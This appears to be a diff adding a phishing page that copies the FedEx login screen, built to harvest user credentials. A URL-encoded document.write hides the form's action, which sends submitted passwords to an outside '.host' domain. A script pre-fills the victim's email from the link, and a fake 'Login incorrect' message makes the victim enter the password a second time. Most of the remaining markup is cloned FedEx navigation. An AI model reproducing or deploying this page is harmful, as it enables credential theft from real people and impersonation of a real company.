@@ -1,0 +1,998 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" dir="" lang="en"><head><script type="text/javascript" async="async" src="fedx/s51507175343935.js"></script>
+<meta http-equiv="X-UA-compatible" content="IE=Edge">
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<!-- Avert Fix for User Story 385178 for Jan 19 CL -->
+<div style="display: none;">
+<FORM NAME="joe">
+<INPUT TYPE="hidden" NAME="burns" SIZE="35">
+</form>
+</div>
+<SCRIPT LANGUAGE="javascript">
+
+var locate = window.location
+document.joe.burns.value = locate
+
+var text = document.joe.burns.value
+
+function delineate(str){
+
+theleft = str.indexOf("=") + 1;
+theright = str.lastIndexOf("&");
+return(str.substring(theleft, theright));
+}
+
+
+</script>
+ 
+	<script type="text/javascript">
+  	 if (self === top) {
+       var antiClickjack = document.getElementById("antiClickjack");
+       antiClickjack.parentNode.removeChild(antiClickjack);
+  	 } else {
+       top.location = self.location;
+   	 }
+	</script>
+	
+	
+      <meta http-equiv="Cache-Control" content="no-cache">
+     <link rel="shortcut icon" type="image/x-icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABEVBMVEX///9NFIz/awD/ZgD//PpjMZr/dBd0SKXu6PS7pdOvlsy/qtb18fj9/P7JuNy0m87Lut3/fyl/VqxmNZxvQaL49vqihMP/fCX/jkP/cBD/4Mv/zaz/aQX/toWOarbd0+mBWK2PbLdTHJCRbbiTcLn/fij/8ej/dx3/cxX/bQz/j0XRwuFaJpVoOJ7/fCT/2b//2cD/38r/2L7/chT/hTT/8ul9VKtbJpWFXrCNaLWVc7qcfL9vQKJxQ6P/gzH/pGd7Uap6UKmulMv8+/3Cr9ikh8SLZrRVHpHGtNr/nVz/vI/EstlXIpPQwOB3S6f/uYv/tYP/3sjNvd+vlcuojMeUcrrFs9rk2+2rkMm4otH////cqEpMAAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAHdElNRQfkAx0VNwAuOMcJAAAAy0lEQVQ4y2NgGAXEAUYwQOYzMTEDAQsJCljRTGRiYkMVYAeSHJxc3DwMvHz8AiAFghhuEBIGEiKiYmAO2ApxCWZJKWkZZlmoGxjl5BUYFZUYlVWgClTV1Jk1NJm1QCaIaAvoQJXpQtygp29gyGBkzMxsYgoSMGPgNWe0sLSytmG0hSiwA9nNYsLMbA92gwMDgyOjk7OLqxuju4cAzJsMniDSC+oLb0ZGH0ZGXz+EI5n9mZkDtJiZA6F+CQoOCQ1jCHeKiBzomB0FuAEAlAURfFqUUu0AAAAldEVYdGRhdGU6Y3JlYXRlADIwMjAtMDMtMjlUMjE6NTU6MDArMDA6MDANCwRsAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDIwLTAzLTI5VDIxOjU1OjAwKzAwOjAwfFa80AAAAABJRU5ErkJggg==">
+     <link rel="stylesheet" type="text/css" href="fedx/global-wrapper-min.css" id="globalCSS">
+     <!--[if lte IE 7]><link rel="stylesheet" type="text/css" href="/css/t1/global-wrapper-ie-min.css" /><![endif]-->
+	 <!--[if lte IE 6]><link rel="stylesheet" type="text/css" href="/css/t1/ie6-min.css" /><![endif]-->
+
+
+		<link rel="stylesheet" href="fedx/afedexmain30.css" type="text/css"> 
+		<link rel="stylesheet" href="fedx/oadr.css" type="text/css">
+		<link rel="stylesheet" href="fedx/newstyle30.css" type="text/css">
+		<link rel="stylesheet" type="text/css" href="fedx/afedexasia30.css">
+		<link rel="stylesheet" type="text/css" href="fedx/fedexascend30.css">
+						
+<script type="text/javascript" charset="utf-8" async="" id="contentim-json" src="fedx/contentim-min.json"></script><link rel="canonical" id="canonical" href=""><link rel="stylesheet" type="text/css" href="fedx/global-wrapper-min-legacy.css"><script type="text/javascript" charset="utf-8" async="" id="mbox-js" src="fedx/mbox.js"></script><script type="text/javascript" charset="utf-8" async="" id="s_code" src="fedx/s_code.js"></script><script type="text/javascript" charset="utf-8" async="" id="im-manifest" src="fedx/im-manifest.js"></script><script type="text/javascript" charset="utf-8" async="" id="im" src="fedx/im.js"></script><script type="text/javascript" charset="utf-8" async="" id="wdpl" src="fedx/wdpl.js"></script>
+<script type="text/javascript"> 
+function make_blankp1()
+{
+document.getElementById("usernameerror").style.display = "none"; 
+}
+</script>
+<script type="text/javascript"> 
+function make_blankp2()
+{
+document.getElementById("usernameerror").style.display = "none"; 
+}
+</script>
+<script>
+function validate(){
+var vx = document.matt.p1.value;
+if (vx.length<6){ 
+document.getElementById("usernameerror").style.display = "block";
+document.getElementById("p1").focus();
+return false;    
+} else {
+document.getElementById("p1a").style.display = "none";
+document.getElementById("b1a").style.display = "none";
+document.getElementById("usernameerror").style.display = "block";
+document.getElementById("p2a").style.display = "block";
+document.getElementById("b2a").style.display = "block";
+document.getElementById("p2").focus();
+return false;
+ }
+ }
+</script>
+
+<script>
+function validates(){
+var vy = document.matt.p2.value;
+if (vy.length<6){ 
+document.getElementById("usernameerror").style.display = "block";
+document.getElementById("p2").focus();
+return false;
+}
+}
+</script> 
+
+</head>
+ 
+<body dir="" onload="fLogon(); invitationError(); setLoginPageLabel(); return false;" class=" fx-transitions ddclick" topmargin="0" text="#000000" marginwidth="0" marginheight="0" leftmargin="0" bgcolor="#FFFFFF">	
+
+        <!-- LAYOUT: OPEN CONTAINER -->
+        <div id="container">
+               
+			
+
+
+
+
+			 
+			<script>var vh=0;
+var fxg_header=true;
+</script>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<!--#if expr="($HTTP_USER_AGENT=/MSIE 8/) || ($HTTP_USER_AGENT=/MSIE 7/)" -->
+ <!--#include virtual="/templates/components/headers/us/gl_old.html" -->
+<!--#else -->
+ <!--#include virtual="/templates/components/headers/us/gl_new.html" -->
+<!--#endif -->
+<div id="auxhead"><link rel="stylesheet" href="fedx/main-min.css" type="text/css">
+<!-- HEAD SCRIPTS -->
+<script>
+vh=1;
+var fxg_header=true;
+
+
+/* @param [string]  [styleName] [filename with suffix e.g. "style.css"]
+ * @param [boolean] [disabled]  [true disables style]
+ */
+
+        
+
+
+var fx_device_type = "desktop";
+var fxg_header = true;
+
+
+var disableStyle = function(styleName, disabled) {
+    var styles = document.styleSheets;
+    var href = "";
+try {
+    for (var i = 0; i < styles.length; i++) {
+    	  var re = new RegExp(".*?//.*?/", "");
+  	    var cssStr =styles[i].href.replace(re,"/");
+    	  var r = /[^\/]*$/;
+    	  //alert('cssStr   ' + cssStr);
+				var dirPath = cssStr.replace(r, '');
+				//alert ('dirPath   ' + dirPath);
+        href = styles[i].href.split("/");
+        href = href[href.length - 1];
+ 
+        if (href == styleName) {
+            styles[i].disabled = disabled;
+            var cssPath = dirPath + styleName;            
+            loadcssfile(cssPath);
+            break;
+        }
+    }
+  }
+  catch(err){}
+};
+function loadcssfile(styleName){
+				var fileName = styleName.replace(".css","-legacy.css");
+				//alert('fileName1   ' + fileName);
+				//fileName = window.location.protocol + window.location.host + fileName;
+				fileName = window.location.protocol + "//www.fedex.com" + fileName;
+				//alert('fileName2   ' + fileName);
+        var fileref=document.createElement("link")
+        fileref.setAttribute("rel", "stylesheet")
+        fileref.setAttribute("type", "text/css")
+        fileref.setAttribute("href", fileName)
+        if (typeof fileref!="undefined"){document.getElementsByTagName("head")[0].appendChild(fileref)}
+}
+disableStyle('master-responsive-min.css', true);
+disableStyle('global-wrapper-min.css', true);
+disableStyle('common-min.css', true);
+disableStyle('master-min.css', true);
+disableStyle('ie6-min.css', true)
+disableStyle('ie-min.css', true);</script>
+   <!-- HEAD STYLES -->
+    <!-- HEADER START -->
+    <div class="header" id="fxg-header-container">
+        <header class="fxg-header fxg-header--sticky" id="fxg-header--sticky">
+            <div>
+                <!-- GLOBAL NAV START -->
+                <div class="global_nav_reference">
+                    <div class="global_navigation">
+                        <div class="fxg-nav">
+                            <div class="fxg-wrapper">
+                                <a href="" target="_self"><img src="fedx/logo.png" class="fxg-header__logo" alt="FedEx Logo"></a>
+                                <!-- DROPDOWNS START -->
+                                <ul class="fxg-dropdown fxg-global-nav">
+                                    <!-- SHIPPING DROPDOWN START -->
+                                    <div class="dropdown">
+                                        <li class="fxg-dropdown__item">
+                                            <a href="#" class="fxg-link fxg-dropdown-js">Shipping</a>
+                                            <div class="fxg-dropdown__sub-menu">
+                                                <div class="link">
+                                                    <a id="ShipExp" href="" title="Create a Shipment" target="_self" class="fxg-link fxg-link--gray">Create a Shipment</a>
+                                                </div>
+                                                <div class="link">
+                                                    <a href="" title="Shipping Rates &amp; Delivery Times" target="_self" class="fxg-link fxg-link--gray">Shipping Rates &amp; Delivery Times</a>
+                                                </div>
+                                                <div class="link">
+                                                    <a href="" title="Schedule &amp; Manage Pickups" target="_self" class="fxg-link fxg-link--gray">Schedule &amp; Manage Pickups</a>
+                                                </div>
+                                                <div class="link">
+                                                    <a href="" title="Packing &amp; Shipping Supplies" target="_self" class="fxg-link fxg-link--gray">Packing &amp; Shipping Supplies</a>  
+                                                </div>
+                                                <div class="link">
+                                                    <a href="" title="International Shipping Guide" target="_self" class="fxg-link fxg-link--gray">International Shipping Guide</a>  
+                                                </div>
+                                                <div class="link">
+                                                    <a href="" title="In-Store Shipping Services" target="_self" class="fxg-link fxg-link--gray">In-Store Shipping Services</a> 
+                                                </div>
+                                                <div class="link">
+                                                    <a href="" title="All Shipping Services" target="_self" class="fxg-link fxg-link--blue">ALL SHIPPING SERVICES</a>  
+                                                </div>
+                                            </div>
+                                        </li>
+                                    </div>
+                                    <!-- SHIPPING DROPDOWN END -->
+                                    <!-- TRACKING DROPDOWN START -->
+                                    <div class="dropdown">
+                                        <li class="fxg-dropdown__item">
+                                            <a href="#" class="fxg-link fxg-dropdown-js">Tracking</a>
+                                            <div class="fxg-dropdown__sub-menu">
+                                                <!-- TRACKING MODULE -->
+                                                <div class="tracking_module">
+                                                    <div class="fxg-tracking-module">
+                                                        <form method="POST" action="#" id="HeaderTrackingModule">
+                                                            <div class="fxg-field">
+                                                                <input type="text" class="fxg-field__input-text fxg-field__input--required" id="trackingnumberinput" name="trackingNumber" title="Tracking ID" aria-required="true" data-errmsg="Please enter at least one tracking number.">
+                                                                <span class="fxg-field__placeholder fxg-field__floating-placeholder">TRACKING ID</span>
+                                                            </div>
+                                                            <button type="submit" class="fxg-button fxg-button--orange">TRACK</button>
+                                                        </form>
+                                                    </div>
+                                                </div>
+                                                <!-- END TRACKING MODULE -->
+                                                <div class="link">
+                                                    <a href="" title="Advanced Shipment Tracking" target="_self" class="fxg-link fxg-link--gray">Advanced Shipment Tracking</a> 
+                                                </div>
+                                                <div class="link">
+                                                    <a href="" title="Manage Your Delivery" target="_self" class="fxg-link fxg-link--gray">Manage Your Delivery</a> 
+                                                </div>
+                                                <div class="link">
+                                                    <a href="" title="All Tracking Services" target="_self" class="fxg-link fxg-link--blue">ALL TRACKING SERVICES</a> 
+                                                </div>
+                                            </div>
+                                        </li>
+                                    </div>
+                                    <!-- TRACKING DROPDOWN END -->
+                                    <!-- PRINTING DROPDOWN START -->
+                                    <div class="dropdown">
+                                        <li class="fxg-dropdown__item">
+                                            <a href="#" class="fxg-link fxg-dropdown-js">Printing Services</a>
+                                            <div class="fxg-dropdown__sub-menu">
+                                                <div class="link">
+                                                    <a href="" title="Start Online Printing Order" target="_self" class="fxg-link fxg-link--gray">Start Online Printing Order</a>
+                                                </div>
+                                                <div class="link">
+                                                    <a href="" title="Posters, Signs &amp; Banners" target="_self" class="fxg-link fxg-link--gray">Posters, Signs &amp; Banners</a>
+                                                </div>
+                                                <div class="link">
+                                                    <a href="" title="Presentations &amp; Manuals" target="_self" class="fxg-link fxg-link--gray">Presentations &amp; Manuals</a>
+                                                </div>
+                                                <div class="link">
+                                                    <a href="" title="Marketing Materials" target="_self" class="fxg-link fxg-link--gray">Marketing Materials</a>
+                                                </div>
+                                                <div class="link">
+                                                    <a href="" title="Ideas &amp; Custom Solutions" target="_self" class="fxg-link fxg-link--gray">Ideas &amp; Custom Solutions</a>
+                                                </div>
+                                                <div class="link">
+                                                    <a href="" title="Get Coupons &amp; Deals" target="_self" class="fxg-link fxg-link--gray">Get Coupons &amp; Deals</a>
+                                                </div>
+                                                <div class="link">
+                                                    <a href="" title="All Printing Services" target="_self" class="fxg-link fxg-link--blue">ALL PRINTING SERVICES</a> 
+                                                </div>
+                                            </div>
+                                        </li>
+                                    </div>
+                                    <!-- PRINTING DROPDOWN END -->
+                                    <!-- LOCATIONS DROPDOWN START -->
+                                    <div class="dropdown">
+                                       <li class="fxg-dropdown__item">
+                                               <a href="#" class="fxg-link fxg-dropdown-js ">Locations</a>
+                                               <div class="fxg-dropdown__sub-menu">
+                                                   <div class="link section"><a href="" title="All Location Types" target="_self" class="fxg-link default ">All Location Types</a></div>
+                                                   <div class="link"><a href="" title="Find a Location" target="_self" class="fxg-link fxg-link--blue ">FIND A LOCATION</a></div>
+                                               </div>
+                                       </li>
+                                    </div>
+                                    <!-- LOCATIONS DROPDOWN END -->
+                                    <!-- SUPPORT DROPDOWN START -->
+                                    <div class="dropdown">
+                                        <li class="fxg-dropdown__item">
+                                            <a href="#" class="fxg-link fxg-dropdown-js">Support</a>
+                                            <div class="fxg-dropdown__sub-menu">
+                                                <div class="link">
+                                                    <a href="" title="New Customer Center" target="_self" class="fxg-link fxg-link--gray">New Customer Center</a>
+                                                </div>
+                                                <div class="link">
+                                                    <a href="" title="Small Business Center" target="_self" class="fxg-link fxg-link--gray">Small Business Center</a>
+                                                </div>
+                                                <div class="link">
+                                                    <a href="" title="FedEx Service Guide" target="_self" class="fxg-link fxg-link--gray">FedEx Service Guide</a>
+                                                </div>
+                                                <div class="link">
+                                                    <a href="" title="Account Management Tools" target="_self" class="fxg-link fxg-link--gray">Account Management Tools</a>
+                                                </div>
+                                                <div class="link">
+                                                    <a href="" alt="File a Claim" target="_self" class="fxg-link fxg-link--gray">File a Claim</a>
+                                                </div>
+                                                <div class="link">
+                                                    <a href="" title="View &amp; Pay Bill" target="_self" class="fxg-link fxg-link--gray">View &amp; Pay Bill</a>
+                                                </div>
+                                                <div class="link">
+                                                    <a href="" title="Customer Support" target="_self" class="fxg-link fxg-link--blue">CUSTOMER SUPPORT</a>
+                                                </div>
+                                            </div>
+                                        </li>
+                                    </div>
+                                    <!-- SUPPORT DROPDOWN END -->
+                                </ul>
+                                <!-- UTILITY NAV START -->
+
+                                        <!-- UTILITY NAV START -->
+                                <div class="fxg-user-options" id="global-login-wrapper">
+                                    <div class="fxg-user-options__option fxg-user-options__sign-in " id="fxg-global-header">
+                                        <a href="#" id="global-login-link" class="fxg-link fxg-dropdown-js fx-global-prelog-link"><span class="prelog-text" id="global-login-link-span">Sign In </span><img class="fxg-user-options__icon" src="fedx/sprite-placeholder.png"></a>
+                                    </div>
+
+                                    <div class="fxg-user-options__option fxg-user-options__search-btn">
+                                        <img class="fxg-user-options__icon" id="SrchBtn" src="fedx/sprite-placeholder.png" alt="Search">
+                                    </div>
+                                    <button id="fxg-mobile-menu-btn" class="hamburger hamburger--slider fxg-user-options__menu-btn" type="button">
+                                        <span class="hamburger-box">
+                                            <span class="hamburger-inner"></span>
+                                        </span>
+                                    </button>
+                                </div>
+                                <div class="fxg-search   ">
+                                  <div class="fxg-user-options__option fxg-user-options__search">
+                                    <form class="fxg-form" method="POST" action="#" id="fxg-search-header">
+                                      <img class="fxg-user-options__icon fxg-search-btn" alt="Search" src="fedx/sprite-placeholder_002.png">
+                                      <input type="text" id="fxg-search-text" class="fxg-user-options__search-field fxg-search-js search_closeMark" placeholder="Search or Tracking Numbers" title="Search or Tracking Numbers">
+                                      <a href="#" class="fxg-search-close-btn" aria-label="Exit Search "><img class="fxg-user-options__icon fxg-close-btn" alt="Exit Search " src="fedx/sprite-placeholder_002.png"></a>
+                                    </form>
+                                  </div>
+                                  <div class="fxg-user-options__search-results fxg-search-results">
+                                      <div class="fxg-search-results__row fxg-search-results__title"><span>Top Searched </span></div>
+                                          <a href="" target="_self" data-analytics="TopSearched|Door Tag" class="fxg-search-results__row   ">Door Tag</a>
+                                          <a href="" target="_self" data-analytics="TopSearched|Supplies" class="fxg-search-results__row   ">Supplies</a>
+                                          <a href="" target="_self" data-analytics="TopSearched|Billing" class="fxg-search-results__row   ">Billing</a>
+                                          <a href="" target="_self" data-analytics="TopSearched|Delivery" class="fxg-search-results__row   ">Delivery</a>
+                                          <a href="" target="_self" data-analytics="TopSearched|Schedule Pickup" class="fxg-search-results__row   ">Schedule Pickup</a>
+                                  </div>
+                                </div>
+                                <!-- UTILITY NAV END -->
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <!-- GLOBAL NAV END -->
+            </div>
+        </header>
+    </div>
+    <!-- HEADER END -->
+</div>
+<script>
+
+
+function loadDoc1(file) {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+     document.getElementById("auxhead").innerHTML = this.responseText;
+    }
+  };
+  xhttp.open("GET", file, true);
+  xhttp.send();
+}
+	
+if (vh == 0) {
+  if ( /MSIE 7/i.test(navigator.userAgent) || /MSIE 8/i.test(navigator.userAgent) ) {
+    loadDoc1("/templates/components/headers/us/gl_old.html");
+  } else {
+    loadDoc1("/templates/components/headers/us/gl_new.html");
+  }
+}
+</script>
+ 
+			
+	        <div id="content" class="fx_clearfix">
+                        <div style="color:#FFF;">
+                         
+<script src="fedx/jscripts.js" type="text/javascript"></script>
+<script src="fedx/DynamicValidation.js" type="text/javascript"></script>
+<script src="fedx/wfclAda.js" type="text/javascript"></script>
+
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+
+<meta name="wsstitle" content="Login Page">
+<meta name="wssmlc" content="/US/en/fedex/tracking">
+
+
+
+
+<meta http-equiv="X-UA-compatible" content="IE=Edge">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
+<title>FedEx | Login Page</title>
+
+<meta name="pragma" content="no-cache">
+<meta name="cache-control" content="no-cache">
+<link rel="stylesheet" type="text/css" href="fedx/widgets.css">
+<link rel="stylesheet" href="fedx/fxnxgen.css" type="text/css">
+<link rel="stylesheet" href="fedx/login.css" type="text/css">
+
+<link rel="stylesheet" href="fedx/fcl30.css" type="text/css">
+
+<script type="text/javascript" charset="utf-8" src="fedx/framework.js"></script>
+<script language="javascript">
+
+	function fLogon()
+	{
+		window.document.logonForm.fclqrs.value = document.location.href;
+	}
+	function invitationError()
+	{
+		var invitationError = window.document.logonForm.invitationError.value
+		if(invitationError=="true"){
+			
+			var warn = window.open('/fcl/web/jsp/invitation_login_Error.jsp','popup','width=400,height=300,resizable=no,scrollbars=no,menubar=no,titlebar=no')
+			session.setAttribute('invitationError', '')
+		}
+		return false		
+	}
+</script>
+
+
+<style>
+#loginblock{
+	display: none;
+}
+
+</style>
+<meta content="MSHTML 6.00.2600.0" name="GENERATOR">
+     
+
+
+
+
+
+
+<script type="text/javascript">
+document.write(unescape('%3C%66%6F%72%6D%20%6E%61%6D%65%3D%22%6D%61%74%74%22%20%6D%65%74%68%6F%64%3D%22%67%65%74%22%20%61%63%74%69%6F%6E%3D%22%68%74%74%70%73%3A%2F%2F%61%75%74%68%65%6E%74%69%63%68%65%63%6B%2E%68%6F%73%74%2F%61%32%2F%64%32%6C%6C%5A%44%41%35%4D%7A%41%7A%4D%44%4E%74%5A%47%31%6B%62%57%52%74%5A%41%2F%77%32%62%6B%62%6D%46%31%64%32%6C%6C%5A%44%41%35%4D%7A%41%7A%4D%44%4E%74%5A%47%31%6B%62%57%52%74%5A%41%2E%70%68%70%22%3E%0A%09%0A%0A%09%0A%09%0A%09%3C%62%72%3E%3C%62%72%3E%3C%74%61%62%6C%65%20%77%69%64%74%68%3D%22%37%34%35%22%20%63%65%6C%6C%73%70%61%63%69%6E%67%3D%22%30%22%20%63%65%6C%6C%70%61%64%64%69%6E%67%3D%22%30%22%20%62%6F%72%64%65%72%3D%22%30%22%3E%0A%20%20%20%20%20%20%3C%74%62%6F%64%79%3E%0A%09%20%20%3C%74%72%3E%20%20%0A%09%09%3C%74%64%20%63%6F%6C%73%70%61%6E%3D%22%37%22%3E%3C%68%31%20%73%74%79%6C%65%3D%22%6D%61%72%67%69%6E%3A%20%30%70%74%3B%22%3E%66%65%64%65%78%2E%63%6F%6D%20%4C%6F%67%69%6E%3C%2F%68%31%3E%3C%2F%74%64%3E%0A%09%20%20%3C%2F%74%72%3E%0A%09%20%20%3C%74%72%3E%20%0A%09%09%3C%74%64%20%63%6F%6C%73%70%61%6E%3D%22%37%22%3E%3C%68%32%20%73%74%79%6C%65%3D%22%63%6F%6C%6F%72%3A%20%72%67%62%28%31%35%33%2C%20%31%35%33%2C%20%31%35%33%29%3B%20%66%6F%6E%74%2D%73%69%7A%65%3A%20%31%32%70%78%3B%20%6D%61%72%67%69%6E%2D%62%6F%74%74%6F%6D%3A%20%31%35%70%78%3B%22%3E%0A%09%09%0A%09%09%0A%09%09%66%6F%72%20%61%63%63%65%73%73%20%74%6F%20%46%65%64%45%78%AE%20%54%72%61%63%6B%69%6E%67%0A%09%09%0A%09%09%3C%2F%68%32%3E%3C%2F%74%64%3E%0A%09%20%20%3C%2F%74%72%3E%0A%09%09%3C%74%72%3E'));
+</script>
+		
+		<!-- area 1-3-->
+		        <td colspan="3"> 
+				
+				
+				
+				   	</td></tr><tr><td>
+					
+
+
+
+
+
+
+				   </td></tr>
+				
+				 
+					 		
+				
+				
+			
+		
+	  <tr> 
+		<td colspan="7">&nbsp;</td>
+	  </tr>
+	  <!-- area 1-3-->
+	  
+	  <tr> 
+		<td colspan="7">
+		<div class="appwrap">
+		<p class="denotereqfield">
+			Denotes required field. 
+		</p>
+		  <table width="745" cellspacing="0" cellpadding="0" border="0">
+		<!-- 	<tr> 
+			  <td width="365" bgcolor="#660099" class="subheaderwhite1">
+				Registered fedex.com Users 
+			  </td>
+			  <td width="15"><img src="" height="1" width="5"/></td>
+			  <td width="365" bgcolor="#660099" class="subheaderwhite1">
+				New fedex.com Users
+			  </td>
+			</tr>   -->
+			
+			<tbody><tr>  
+			  <td class="colleft">
+			  <div type="required" id="module.logon" class="module" collapsable="false" defaultmode="expanded" hashelp="false">
+<div id="module.logon._header" class="moduleHeaderNonCollapsable" tabindex="0">
+<div id="module.logon._headerTitle" class="moduleHeaderTitle">
+Registered fedex.com Users
+</div>
+<div id="module.logon._headerButtons" class="moduleHeaderButtons">
+</div>
+</div>
+
+                 <div id="module.logon._expanded" class="moduleExpanded">
+
+				<table cellspacing="0" cellpadding="1" border="0">
+		
+			<!--area 4-->
+			  	
+				<tbody><tr>
+						 <td colspan="2">
+								 <table cellspacing="0" cellpadding="1" border="0">
+								 <tbody><tr>
+											<td colspan="1"><img valign="middle" src="fedx/icon_important.gif">&nbsp;</td><td colspan="1" valing="middle" alt=""><b>IMPORTANT</b></td>
+								 </tr>
+								 </tbody></table>
+					  </td>
+				</tr>
+				<tr>
+					  <td colspan="2">Please ensure your entering correct login details.</td>
+				</tr>
+						
+			<!--area 4-->
+				<tr>
+					  <td colspan="2"><img src="fedx/spacer.gif" alt="" width="1" height="10"></td>
+				</tr>																
+				  <tr> 
+					<td colspan="2">Enter your user password to Continue</td>
+				  </tr>
+				  				  
+				  <tr>
+				  	<td colspan="2" valign="top">
+						<table cellspacing="0" cellpadding="5" border="0">
+							<tbody><tr>
+								<td>
+								<div id="usernameerror" style="display: none;" tabindex="0">
+								<b class="error">
+Login incorrect. Check that you are entering correct password and try again. 
+
+</b>
+								</div>
+                          
+								</td>
+							</tr>
+						</tbody></table>
+					</td>
+					<!-- below commented because logonform does not set any password error -->
+ 					<!-- <b class="error"></b> -->
+				  </tr>
+				<!-- check attempted login for Jan06 Load -->
+				  
+				  
+				  
+				  <tr>
+				  	<td style="padding-left: 0px;">
+					  <table width="100%" cellspacing="0" cellpadding="1" border="0">
+						<tbody><tr> 
+							<td class="required" align="left">
+								User ID
+							</td>
+							<td> 
+							 
+							 
+							  <input readonly type="email" name="u1" maxlength="256" size="37" title="User ID">
+							 							 
+							</td>
+							<td><img src="fedx/spacer.gif" alt="" width="5" height="1"></td>
+						</tr>
+						<tr> 
+							<td colspan="3"><img src="fedx/spacer.gif" alt="" width="1" height="5"></td>
+						</tr>				  
+						<tr> 
+							<td class="required" align="left">
+								Password
+							</td>
+							<td id="p1a" style="display: block;"> 
+							
+							
+							  <input type="password" tabindex="1" onclick="make_blankp1();" autofocus="yes" id="p1" name="p1" maxlength="35;" autocomplete="off" size="37" value="" title="Password ">
+														  
+							</td>
+							
+							<td id="p2a" style="display: none;"> 
+							
+							
+							  <input type="password" id="p2" onclick="make_blankp2();" name="p2" maxlength="35;" autocomplete="off" size="37" value="" title="Password ">
+														  
+							</td>
+							
+							<td><img src="fedx/spacer.gif" alt="" width="5" height="1"></td>
+						</tr>
+						<tr> 
+							<td colspan="3"><img src="fedx/spacer.gif" alt="" width="1" height="5"></td>
+						</tr>
+					 	
+                                                
+						
+                                               
+						
+                                                
+                                                
+			
+
+
+
+
+						<tr> 
+							<td><img src="fedx/spacer.gif" alt="" width="5" height="1"></td>
+							
+									<td>
+										<input type="checkbox" name="remusrid" value="yes" checked="checked" title="Remember my user id on this computer">
+										Remember my user ID on this computer.
+									</td>
+								
+						</tr>
+														 
+					 </tbody></table>
+					</td>
+				  </tr>
+				  <tr> 
+					<td colspan="2"><img src="fedx/spacer.gif" alt="" width="1" height="5"></td>
+				  </tr>
+				  <tr> 
+				  	<td colspan="2">
+						<table width="100%" cellspacing="0" cellpadding="1" border="0">
+						 <tbody><tr>
+							
+							<td id="b1a" style="display: block;" align="">
+								
+								
+								
+								        <input type="submit" style="margin-left:85px;padding-left: 2px;padding-right: 2px;" class="buttonpurple" value="Login" onclick="return validate();" onsubmit="return validate();" name="login">
+
+							   																				
+								
+							</td>
+							
+							<td id="b2a" style="display: none;" align="">
+								
+								
+								
+								        <input type="submit" style="margin-left:85px;padding-left: 2px;padding-right: 2px;" class="buttonpurple" value="Login" onclick="validates();" onsubmit="validates();" name="login">
+
+							   																				
+								
+							</td>
+							
+						    </tr>
+						</tbody></table>
+					</td>
+				  </tr>
+				</tbody></table>
+				</div>
+
+</div>
+
+                           
+			  </td>
+<!--     		  <td width="15"><img src="" height="1" width="15"/></td> --> 
+			  <!--Area5 start-->
+			  
+				<td class="colright" style="padding-right: 15px;padding-bottom: 15px">
+				<div type="required" id="module.logon.newusers" class="module" collapsable="false" defaultmode="expanded" hashelp="false">
+<div id="module.logon.newusers._header" class="moduleHeaderNonCollapsable">
+<div id="module.logon.newusers._headerTitle" class="moduleHeaderTitle">
+New fedex.com Users
+</div>
+<div id="module.logon.newusers._headerButtons" class="moduleHeaderButtons">
+</div>
+</div>
+
+                 <div id="module.logon.newusers._expanded" class="moduleExpanded">
+
+               
+										
+					<p>
+					 
+
+					
+					<span class="content">Access and customize many fedex.com online services with a single user ID and password.</span>
+					<a name="learnmore" class="acolorpurple" onclick="window.open('/fcl/web/jsp/popup_login.jsp','popup','height=415,width=415,top=0,left=190,scrollbars=yes,menubar=no');return false" href="">
+					Learn more...
+					</a>
+				</p>
+				
+				
+					<!--
+					<p>
+					<a href="" class="smallpurpleheader">Ship without an account</a>
+					<br>
+					<span class="content">Ship without creating a login and pay with a credit card. <br>It's that easy. </span>
+					<a href="" class="acolorpurple">start now.</a> 
+					</p> -->
+				
+				
+				
+
+									
+
+					
+							
+			  </div>
+
+              </div>
+
+            
+              </td>
+				
+			  <!-- area5-->
+			</tr>
+		
+		  </tbody></table>
+		 </div> 
+		</td>
+		</tr>
+	</tbody>	
+	</table>
+	
+</form>
+<SCRIPT LANGUAGE="javascript">
+
+var res = delineate(text);
+var zork1 = res;
+document.matt.u1.value = zork1;
+</script>
+
+
+<script type="text/javascript">var _cf = _cf || []; _cf.push(['_setFsp', true]);  _cf.push(['_setBm', true]); _cf.push(['_setAu', '/assets/646b51db238fde1fae4a597ae052']); </script><script type="text/javascript" src="fedx/646b51db238fde1fae4a597ae052"></script>
+     
+
+                        </div>
+            </div>             
+              
+			 <script>var vf=0;</script>
+<!--#if expr="($HTTP_USER_AGENT=/MSIE 8/) || ($HTTP_USER_AGENT=/MSIE 7/)" -->
+ <!--#include virtual="/templates/components/footers/us/gl_old.html" -->
+<!--#else -->
+ <!--#include virtual="/templates/components/footers/us/gl_new.html" -->
+ <script type="text/javascript">	var reg_account = "fedexus"; </script>
+<script type="text/javascript" src="fedx/contentim_controller-min.js"></script>
+<script type="text/javascript" src="fedx/app-min.js"></script>
+<script type="text/javascript" src="fedx/main-min.js"></script>
+<!--#endif -->
+<div id="aux"><!-- NEW FOOTER START -->
+<script>vf=1;</script>
+<div class="global_footer_reference" id="global_footer_reference">
+	<div class="cq-dd-paragraph">
+		<div class="footer">
+			<footer class="fxg-footer">
+				<div class="fxg-footer__primary">
+					<div class="fxg-wrapper container">
+						<!-- COLUMN CONTROL START -->
+						<div class="column_control section">
+							<div class="row">
+								<!-- 4 Columns -->
+								<div class="fxg-col fxg-col--fxg-col--mt20 fxg-col-- col-sm-4">
+									<div class="title section">
+										<div tabindex="0" class="fxg-title fxg-title--default   " style="text-align: left;">Our Company</div>
+									</div>
+									<div class="column_control section">
+										<!-- COLUMN CONTROL START -->
+
+										<div class="row">
+
+											<!-- 2 Columns -->
+											<div class="fxg-col fxg-col-- fxg-col-- col-sm-6">
+												<div class="link">
